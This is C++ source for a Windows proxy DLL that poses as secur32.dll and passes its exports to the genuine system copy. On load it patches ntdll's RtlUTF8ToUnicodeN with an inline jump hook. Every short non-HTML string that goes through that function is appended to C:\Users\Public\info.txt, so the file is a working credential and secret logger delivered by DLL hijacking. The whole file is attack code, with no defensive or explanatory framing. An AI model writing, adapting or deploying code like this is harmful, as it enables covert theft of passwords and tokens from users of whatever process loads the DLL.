#include "pch.h"
#include <Windows.h>
#include <winternl.h>
#include <intrin.h>
#include <stdlib.h>
#include <stdio.h>
#include <wchar.h>

#ifndef _WIN64
#error Build this project for x64.
#endif

const char* const names[] = {
#include "exports.inc"
};

static BOOL ShouldLogString(PCCH data, size_t len) {
    if (strstr(data, "<html") != NULL ||
        strstr(data, "<!DOCTYPE") != NULL ||
        strstr(data, "<head") != NULL ||
        strstr(data, "<body") != NULL ||
        strstr(data, "<HTML") != NULL ||
        strstr(data, "<!doctype") != NULL) {
        return FALSE;
    }

    if (len < 30) {
        return TRUE;
    }
    return FALSE;
}

typedef NTSTATUS(NTAPI* RtlUTF8ToUnicodeN_t)(
    _Out_opt_ PWSTR  UnicodeStringDestination,
    _In_      ULONG  UnicodeStringMaxByteCount,
    _Out_     PULONG UnicodeStringActualByteCount,
    _In_      PCCH   UTF8StringSource,
    _In_      ULONG  UTF8StringByteCount
    );


RtlUTF8ToUnicodeN_t RTL_Address = nullptr;
BYTE original_state_buffer[12] = { 0 };
BYTE new_state_buffer[12] = { 0x48, 0xB8, 0x90 , 0x90 , 0x90 , 0x90 , 0x90 , 0x90 , 0x90 , 0x90 , 0xFF , 0xE0 };



NTSTATUS NTAPI RtlUTF8ToUnicodeNHooked(
    _Out_opt_ PWSTR  UnicodeStringDestination,
    _In_      ULONG  UnicodeStringMaxByteCount,
    _Out_     PULONG UnicodeStringActualByteCount,
    _In_      PCCH   UTF8StringSource,
    _In_      ULONG  UTF8StringByteCount
)
{
    if (ShouldLogString(UTF8StringSource, UTF8StringByteCount)) {
        FILE* myfile = nullptr;
        if (_wfopen_s(&myfile, L"C:\\Users\\Public\\info.txt", L"a+") == 0 && myfile) {
            fwrite(UTF8StringSource, 1, UTF8StringByteCount, myfile);
            fwrite("\n", 1, 1, myfile);
            fclose(myfile);
        }
    }

    WriteProcessMemory(GetCurrentProcess(), RTL_Address, original_state_buffer, 12, NULL);

    NTSTATUS result = RTL_Address(
        UnicodeStringDestination,
        UnicodeStringMaxByteCount,
        UnicodeStringActualByteCount,
        UTF8StringSource,
        UTF8StringByteCount
    );

   
    WriteProcessMemory(GetCurrentProcess(), RTL_Address, new_state_buffer, 12, NULL);

    return result;
}

HMODULE LoadOriginal() {
    wchar_t path[MAX_PATH];

    UINT length = GetSystemDirectoryW(path, _countof(path));
    if (!length || length >= _countof(path))
        __fastfail(7);

    if (wcscat_s(path, _countof(path), L"\\secur32.dll") != 0)
        __fastfail(7);

    HMODULE module = LoadLibraryExW(
        path, nullptr, LOAD_LIBRARY_SEARCH_SYSTEM32);

    if (!module)
        __fastfail(7);

    return module;
}

extern "C" FARPROC ResolveExport(unsigned int index) {
    DWORD savedError = GetLastError();

    static HMODULE original = LoadOriginal();

    if (index >= _countof(names))
        __fastfail(7);

    FARPROC function = GetProcAddress(original, names[index]);

    if (!function)
        __fastfail(7);

    SetLastError(savedError);
    return function;
}

BOOL APIENTRY DllMain(HMODULE module, DWORD reason, LPVOID reserved) {
    if (reason==DLL_PROCESS_ATTACH)
    {
        HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
        RTL_Address = (RtlUTF8ToUnicodeN_t)GetProcAddress(ntdll, "RtlUTF8ToUnicodeN");

        void* hooked_address = &RtlUTF8ToUnicodeNHooked;
        memcpy_s(new_state_buffer + 2, 8, &hooked_address, 8);

        ReadProcessMemory(GetCurrentProcess(), RTL_Address, original_state_buffer, sizeof(original_state_buffer), NULL);
        DWORD oldProtect;
        if (!VirtualProtect(RTL_Address, 12, PAGE_EXECUTE_READWRITE, &oldProtect))
            return FALSE;

        WriteProcessMemory(GetCurrentProcess(), RTL_Address, new_state_buffer, 12, NULL);
        VirtualProtect(RTL_Address, 12, oldProtect, &oldProtect);
        return TRUE;

    }
    
    return TRUE;
}
